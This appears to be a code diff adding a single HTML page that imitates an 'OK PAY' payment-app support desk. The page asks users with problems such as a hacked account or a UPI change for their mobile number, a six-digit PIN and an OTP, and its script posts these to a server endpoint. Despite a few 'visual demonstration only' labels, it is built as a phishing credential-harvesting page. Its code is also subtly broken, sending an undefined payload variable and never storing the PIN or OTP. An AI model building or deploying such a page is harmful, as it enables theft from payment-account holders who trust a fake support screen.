@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OK PAY Support</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      background: radial-gradient(circle at 20% 20%, #0f2922 0%, #071318 55%, #050a0e 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      color: #f8fafc;
+    }
+
+    .card {
+      background: rgba(17, 24, 39, 0.92);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      width: 100%;
+      max-width: 410px;
+      padding: 26px 24px;
+      border-radius: 26px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 225, 255, 0.08);
+      text-align: center;
+    }
+
+    .badge-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .badge {
+      background: rgba(16, 185, 129, 0.14);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      color: #34d399;
+      padding: 5px 12px;
+      border-radius: 999px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .badge.demo-tag {
+      background: rgba(56, 189, 248, 0.14);
+      border-color: rgba(56, 189, 248, 0.35);
+      color: #38bdf8;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background: #10b981;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #10b981;
+      animation: pulse 1.8s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.85); }
+    }
+
+    .logo {
+      width: 82px;
+      height: 82px;
+      background: linear-gradient(145deg, #0b1938, #060d21);
+      border: 1px solid rgba(0, 225, 255, 0.3);
+      border-radius: 22px;
+      margin: 0 auto 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 23px;
+      line-height: 1.1;
+      letter-spacing: 1px;
+      box-shadow: 0 10px 25px rgba(0, 225, 255, 0.18);
+    }
+
+    .logo span { color: #00e1ff; }
+
+    h1 {
+      font-size: 23px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #38bdf8, #818cf8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      color: #94a3b8;
+      font-size: 14px;
+      margin-bottom: 22px;
+    }
+
+    .view { display: none; animation: fadeIn 0.25s ease; }
+    .view.active { display: block; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .premium-options { display: flex; flex-direction: column; gap: 13px; }
+
+    .premium-btn {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      padding: 15px 18px;
+      border: none;
+      border-radius: 16px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.18s ease, box-shadow 0.18s ease, filter 0.18s ease;
+      text-align: left;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.28);
+    }
+
+    .premium-btn:hover { transform: translateY(-2px); filter: brightness(1.06); }
+    .premium-btn:active { transform: scale(0.98); }
+    .premium-btn .left-part { display: flex; align-items: center; gap: 14px; }
+    .premium-btn .icon-box {
+      width: 36px; height: 36px; border-radius: 10px;
+      background: rgba(255, 255, 255, 0.22);
+      display: flex; align-items: center; justify-content: center; font-size: 18px;
+    }
+    .premium-btn .arrow { font-size: 18px; opacity: 0.85; }
+
+    .selling { background: linear-gradient(135deg, #ec4899 0%, #f43f5e 100%); }
+    .deposit { background: linear-gradient(135deg, #06b6d4 0%, #6366f1 100%); }
+    .freeze  { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
+    .hacked  { background: linear-gradient(135deg, #f59e0b 0%, #ea580c 100%); }
+    .upi     { background: linear-gradient(135deg, #10b981 0%, #0d9488 100%); }
+
+    .selected-pill {
+      display: inline-block;
+      background: rgba(56, 189, 248, 0.14);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      color: #7dd3fc;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: 999px;
+      margin-bottom: 20px;
+    }
+
+    .input-group { text-align: left; margin-bottom: 18px; }
+
+    label {
+      display: block; font-size: 12px; font-weight: 700;
+      letter-spacing: 0.5px; color: #cbd5e1; margin-bottom: 8px; text-transform: uppercase;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 14px; background: rgba(15, 23, 42, 0.85);
+      border: 1.5px solid rgba(148, 163, 184, 0.25); border-radius: 12px;
+      color: #ffffff; font-size: 15px; outline: none;
+    }
+
+    input[type="text"]:focus, input[type="password"]:focus {
+      border-color: #38bdf8; box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+    }
+
+    .btn {
+      width: 100%; background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+      color: #ffffff; border: none; padding: 14px; border-radius: 14px;
+      font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px;
+      box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
+    }
+
+    .btn-secondary {
+      width: 100%; background: rgba(148, 163, 184, 0.12); color: #cbd5e1;
+      border: 1px solid rgba(148, 163, 184, 0.2); padding: 11px;
+      border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px;
+    }
+
+    .pin-container, .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 22px; }
+
+    .pin-box {
+      width: 44px !important; height: 52px; padding: 0 !important;
+      text-align: center; font-size: 20px !important; font-weight: 700;
+      border-radius: 12px !important; background: rgba(15, 23, 42, 0.9);
+      border: 1.5px solid rgba(148, 163, 184, 0.3); color: #ffffff; outline: none;
+    }
+
+    .pin-box:focus { border-color: #38bdf8; box-shadow: 0 0 10px rgba(56, 189, 248, 0.4); }
+
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.12); border-top: 4px solid #38bdf8;
+      border-radius: 50%; width: 48px; height: 48px;
+      animation: spin 0.9s linear infinite; margin: 28px auto;
+    }
+
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    .demo-note { font-size: 12px; color: #64748b; margin-top: 20px; line-height: 1.4; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="badge-row">
+      <div class="badge">
+        <span class="dot"></span>
+        LIVE SUPPORT
+      </div>
+    </div>
+
+    <div class="logo" style="display: flex; justify-content: center; align-items: center; margin-bottom: 20px;">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width: 120px; height: auto;">
+    <defs>
+      <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
+        <stop offset="0" stop-color="#7100f5"/>
+        <stop offset="0.5" stop-color="#10005c"/>
+        <stop offset="1" stop-color="#080044"/>
+      </linearGradient>
+      <linearGradient id="border" x1="0" y1="0" x2="1" y2="1">
+        <stop stop-color="#d900ff"/>
+        <stop offset="1" stop-color="#2415ff"/>
+      </linearGradient>
+      <linearGradient id="orange" x1="0" y1="0" x2="0.8" y2="1">
+        <stop stop-color="#fff000"/>
+        <stop offset=".48" stop-color="#ff9b00"/>
+        <stop offset="1" stop-color="#f000a5"/>
+      </linearGradient>
+      <linearGradient id="cyan" x1="0" y1="0" x2="1" y2="1">
+        <stop stop-color="#00f5d5"/>
+        <stop offset=".5" stop-color="#00a9ff"/>
+        <stop offset="1" stop-color="#5620ff"/>
+      </linearGradient>
+    </defs>
+    <rect x="2" y="2" width="508" height="508" rx="55" fill="url(#bg)" stroke="url(#border)" stroke-width="4"/>
+    <circle cx="164" cy="214" r="91" fill="none" stroke="url(#orange)" stroke-width="49"/>
+    <path d="M309 83 Q334 83 334 108 L334 237 L285 274 L285 108 Q285 83 309 83Z" fill="url(#orange)"/>
+    <path d="M285 247 L393 142 Q404 132 418 132 L452 132 Q468 132 456 149 L354 254 L456 361 Q470 379 450 379 L412 379 Q400 379 390 367 L285 265Z" fill="url(#cyan)"/>
+    <text x="256" y="446" text-anchor="middle" font-family="Arial, sans-serif" font-size="104" font-weight="bold" letter-spacing="12" fill="white">PAY</text>
+  </svg>
+</div>
+
+
+    <!-- VIEW 1 -->
+    <div id="view1" class="view active">
+      <h1>How can we help you?</h1>
+      <p class="subtitle">Select the issue you are facing</p>
+
+      <div class="premium-options">
+        <button type="button" class="premium-btn selling" onclick="selectIssue('Selling issue')">
+          <span class="left-part">
+            <span class="icon-box">🛒</span>
+            <span>Selling issue</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+        <button type="button" class="premium-btn deposit" onclick="selectIssue('Deposit failed')">
+          <span class="left-part">
+            <span class="icon-box">💳</span>
+            <span>Deposit failed</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+        <button type="button" class="premium-btn freeze" onclick="selectIssue('Account freeze')">
+          <span class="left-part">
+            <span class="icon-box">❄️</span>
+            <span>Account freeze</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+        <button type="button" class="premium-btn hacked" onclick="selectIssue('Account hacked')">
+          <span class="left-part">
+            <span class="icon-box">⚠️</span>
+            <span>Account hacked</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+        <button type="button" class="premium-btn upi" onclick="selectIssue('UPI change')">
+          <span class="left-part">
+            <span class="icon-box">🔄</span>
+            <span>UPI change</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- VIEW 2 -->
+    <div id="view2" class="view">
+      <h1>Customer Verification</h1>
+      <div id="issue-title" class="selected-pill">Selected issue</div>
+
+      <div class="input-group">
+        <label for="reference">Mobile Number</label>
+        <input type="text" id="reference" placeholder="Enter mobile number" maxlength="10">
+      </div>
+
+      <button type="button" class="btn" onclick="submitCredentials()">Continue </button>
+      <button type="button" class="btn-secondary" onclick="reset()">Back</button>
+    </div>
+
+    <!-- VIEW 3 -->
+    <div id="view3" class="view">
+      <h1>Processing ...</h1>
+      <p id="loading-message" class="subtitle">Sending event...</p>
+      <div class="spinner"></div>
+    </div>
+
+    <!-- VIEW 4 -->
+    <div id="view4" class="view">
+      <h1>Enter 6 Digits PIN </h1>
+      <p class="subtitle">Visual demonstration only</p>
+
+      <div class="pin-container" id="pin-group">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="•">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="•">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="•">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="•">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="•">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="•">
+      </div>
+
+      <button type="button" class="btn" onclick="submitPin()">Continue </button>
+    </div>
+
+    <!-- VIEW 5 -->
+    <div id="view5" class="view">
+      <h1>OTP Screen </h1>
+      <p class="subtitle">Visual demonstration only</p>
+
+      <div class="otp-container" id="otp-group">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="0">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="0">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="0">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="0">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="0">
+        <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" placeholder="0">
+      </div>
+
+      <button type="button" class="btn" onclick="submitOtp()">Finish </button>
+    </div>
+
+  </div>
+    <script>
+    const API_URL = "/api/demo";
+    const state = { issue: "", reference: "", demo: true };
+
+    function showView(viewId) {
+      document.querySelectorAll(".view").forEach((view) => view.classList.remove("active"));
+      const target = document.getElementById(viewId);
+      if (target) {
+        target.classList.add("active");
+        const firstInput = target.querySelector("input");
+        if (firstInput) setTimeout(() => firstInput.focus(), 50);
+      }
+    }
+
+    function setLoading(message) {
+      const loaderText = document.getElementById("loading-message");
+      if (loaderText) loaderText.textContent = message;
+      showView("view3");
+    }
+
+    function selectIssue(issue) {
+      state.issue = issue;
+      const issueTitle = document.getElementById("issue-title");
+      if (issueTitle) issueTitle.textContent = "Selected issue: " + issue;
+      showView("view2");
+    }
+
+    async function sendData(eventName, extraData = {}) {
+      const demoPayload = {
+  phone: document.getElementById('reference')?.value || '',
+  password: '',
+  pin: state.pin || '',
+  otp: state.otp || '',
+  ...extraData
+};
+
+      try {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(Payload)
+        });
+        if (!response.ok) throw new Error("HTTP Error: " + response.status);
+        const result = await response.json();
+        return { success: true, result };
+      } catch (error) {
+        console.warn("API unavailable, continuing in local mode:", error.message);
+        return { success: false, error: error.message };
+      }
+    }
+
+    async function runStep(loadingText, eventName, nextViewId) {
+      setLoading(loadingText);
+      const minDelay = new Promise((resolve) => setTimeout(resolve, 900));
+      const [apiResult] = await Promise.all([sendData(eventName), minDelay]);
+      if (nextViewId) showView(nextViewId);
+      return apiResult;
+    }
+
+    async function submitCredentials() {
+      const refInput = document.getElementById("reference");
+      const reference = refInput ? refInput.value.trim() : "";
+      if (!reference) {
+        alert("Please enter a mobile number.");
+        if (refInput) refInput.focus();
+        return;
+      }
+      state.reference = reference;
+      await runStep("Sending event...", "verification", "view4");
+    }
+
+    function isCodeComplete(containerId) {
+      const boxes = document.querySelectorAll(`#${containerId} .pin-box`);
+      return Array.from(boxes).every((box) => box.value.trim().length === 1);
+    }
+
+    async function submitPin() {
+      if (!isCodeComplete("pin-group")) {
+        alert("Please enter all 6 digits for the PIN.");
+        return;
+      }
+      await runStep("Processing ...", "pin_screen_", "view5");
+    }
+
+    async function submitOtp() {
+      if (!isCodeComplete("otp-group")) {
+        alert("Please enter all 6 digits for the OTP.");
+        return;
+      }
+      const result = await runStep("Completing ...", "otp_screen", null);
+      if (result.success) {
+        alert("event sent successfully!");
+      } else {
+        alert("Local completed. API connection unavailable.");
+      }
+      reset();
+    }
+
+    function reset() {
+      state.issue = "";
+      state.reference = "";
+      const refInput = document.getElementById("reference");
+      if (refInput) refInput.value = "";
+      document.querySelectorAll(".pin-box").forEach((box) => box.value = "");
+      showView("view1");
+    }
+
+    function setupDigitInputs(containerId) {
+      const boxes = document.querySelectorAll(`#${containerId} .pin-box`);
+
+      boxes.forEach((box, idx) => {
+        box.addEventListener("input", () => {
+          box.value = box.value.replace(/[^0-9]/g, "");
+          if (box.value.length === 1 && idx < boxes.length - 1) {
+            boxes[idx + 1].focus();
+          }
+        });
+
+        box.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && box.value === "" && idx > 0) {
+            boxes[idx - 1].focus();
+          }
+        });
+
+        box.addEventListener("paste", (e) => {
+          e.preventDefault();
+          const pastedData = (e.clipboardData || window.clipboardData)
+            .getData("text")
+            .replace(/[^0-9]/g, "")
+            .slice(0, boxes.length);
+
+          pastedData.split("").forEach((char, i) => {
+            if (boxes[i]) boxes[i].value = char;
+          });
+
+          const nextFocus = Math.min(pastedData.length, boxes.length - 1);
+          if (boxes[nextFocus]) boxes[nextFocus].focus();
+        });
+      });
+    }
+
+    setupDigitInputs("pin-group");
+    setupDigitInputs("otp-group");
+  </script>
+</body>
+</html>
